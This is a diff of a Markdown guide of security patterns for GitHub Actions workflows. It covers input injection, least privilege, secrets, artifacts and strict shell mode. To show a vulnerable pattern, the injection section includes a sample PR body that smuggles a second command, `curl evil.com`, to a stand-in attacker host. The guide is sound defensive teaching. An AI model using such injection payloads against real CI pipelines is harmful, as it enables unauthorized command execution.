@@ -1,8 +1,9 @@
 ---
 name: github-workflow-security-patterns
 description: Canonical security patterns for GitHub Actions workflows
-version: "1.0.0"
-author: JacobPEvans
+metadata:
+  version: "1.0.0"
+  author: JacobPEvans
 ---
 
 # GitHub Workflow Security Patterns
@@ -14,16 +15,19 @@ Best practices and canonical patterns for secure GitHub Actions workflows.
 **Problem**: Untrusted input (PR description, issue body, etc.) directly in `run:` command allows injection attacks.
 
 **Vulnerable Pattern**:
+
 ```yaml
 - run: curl https://api.example.com -d "${{ github.event.pull_request.body }}"
 ```
 
 **Attack**: If PR body is `'; curl evil.com; #`, the final command becomes:
+
 ```bash
 curl https://api.example.com -d "'; curl evil.com; #"
 ```
 
 **Safe Pattern**: Wrap untrusted input in environment variable
+
 ```yaml
 - name: Send Data
   env:
@@ -34,6 +38,7 @@ curl https://api.example.com -d "'; curl evil.com; #"
 **Why Safe**: The untrusted value is now a shell variable, not part of the command syntax. Injection attack becomes literal string value.
 
 **Dangerous contexts to always wrap**:
+
 - `github.event.pull_request.body`
 - `github.event.pull_request.title`
 - `github.event.issue.body`
@@ -48,7 +53,8 @@ curl https://api.example.com -d "'; curl evil.com; #"
 
 **Principle**: Request only minimum permissions needed.
 
-**Anti-pattern** (over-permissioned):
+**Anti-pattern** (excess permissions):
+
 ```yaml
 jobs:
   build:
@@ -59,6 +65,7 @@ jobs:
 ```
 
 **Pattern** (least-privilege):
+
 ```yaml
 jobs:
   build:
@@ -67,6 +74,7 @@ jobs:
 ```
 
 **Why it matters**:
+
 - Limits blast radius if token is compromised
 - Follows security principle of least privilege
 - Passes CodeQL "missing-workflow-permissions" check
@@ -117,11 +125,13 @@ jobs:
 ```
 
 **DO NOT**:
+
 - Hardcode secrets in workflow files
 - Echo secrets to stdout (GitHub tries to mask but not guaranteed)
 - Store credentials in repository
 
 **Correct pattern**:
+
 ```yaml
 # ✅ GOOD
 - run: npm publish
@@ -149,6 +159,7 @@ jobs:
 ```
 
 **DO NOT**:
+
 - Store secrets in artifacts
 - Upload sensitive files
 - Keep artifacts forever (costs storage)
@@ -167,6 +178,7 @@ jobs:
 ```
 
 **What it does**:
+
 - `set -e`: Exit immediately if any command fails
 - `set -u`: Treat undefined variables as error
 - `set -o pipefail`: Pipe command fails if any step fails
@@ -188,12 +200,14 @@ jobs:
 ```
 
 **Safe condition context**:
+
 - `github.event_name` - Type of event (push, pull_request, etc.)
 - `github.ref` - Current branch/tag
 - `job.status` - Previous job status
 - `needs.<job-id>.result` - Result of dependency
 
 **Dangerous contexts** (never use unescaped):
+
 - `github.event.pull_request.body`
 - `github.event.issue.title`
 - Anything from user input
@@ -246,6 +260,7 @@ jobs:
 ```
 
 **DO NOT**:
+
 - Log secrets (GitHub masks but not guaranteed)
 - Log sensitive file contents
 - Disable logging for "cleaner" output
@@ -271,7 +286,7 @@ Before committing a workflow:
 |---------|-----|
 | Missing `permissions:` block | Add explicit least-privilege permissions |
 | `${{ github.event.body }}` in `run:` | Wrap in `env:` variable |
-| Over-permissioning with `contents: write` | Use `contents: read` unless truly needed |
+| Excess `contents: write` | Use `contents: read` unless truly needed |
 | No `set -e` in multi-line scripts | Add `set -euo pipefail` |
 | Hardcoded credentials | Move to GitHub Secrets, reference via `env:` |
 | Actions at `@latest` | Pin to `@v6` or `@<commit-hash>` |
@@ -279,3 +294,7 @@ Before committing a workflow:
 ---
 
 **Remember**: Security in CI/CD is about preventing accidents AND malicious actions. These patterns protect against both.
+
+## Related Skills
+
+- codeql-permission-classification (codeql-resolver)
